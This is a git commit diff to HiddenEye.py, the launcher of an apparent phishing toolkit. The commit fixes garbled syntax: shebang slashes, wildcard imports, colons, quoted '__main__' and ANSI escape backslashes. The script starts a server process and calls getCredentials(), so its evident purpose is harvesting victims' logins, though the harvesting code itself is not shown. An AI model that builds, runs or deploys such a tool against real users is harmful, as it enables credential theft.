7d0a820ef3ee54b11c0cdc678b0f7ac500b903db
ColdFire12331 <53457058+ColdFire12331@users.noreply.github.com>
2019-07-30 10:26:25 +0800

    Add files via upload

--- HiddenEye.py
+++ HiddenEye.py
@@ -1,17 +1,17 @@
-#!usrbinpython3
+#!/usr/bin/python3
 #
 #HiddenEye by Open Source Community
 #
 import multiprocessing
 import gettext
 import sys
-from Defs.Checks import 
-from Defs.Configurations import 
-from Defs.Actions import 
-from Defs.Languages import 
+from Defs.Checks import *
+from Defs.Configurations import *
+from Defs.Actions import *
+from Defs.Languages import *
 from os import system
 
-RED, WHITE, CYAN, GREEN, DEFAULT = '033[91m', '033[46m', '033[36m', '033[1;32m',  '033[0m'
+RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 checkPermissions()
 installGetText()
 languageSelector()
@@ -21,8 +21,8 @@ ifSettingsNotExists()
 readConfig()
 
 
-if __name__ == __main__
-    try
+if __name__ == "__main__":
+    try:
         runMainMenu()
         mainMenu()
         
@@ -37,6 +37,6 @@ if __name__ == __main__
         multiprocessing.Process(target=runServer).start()
         getCredentials()
 
-    except KeyboardInterrupt
+    except KeyboardInterrupt:
         endMessage()
         exit(0)
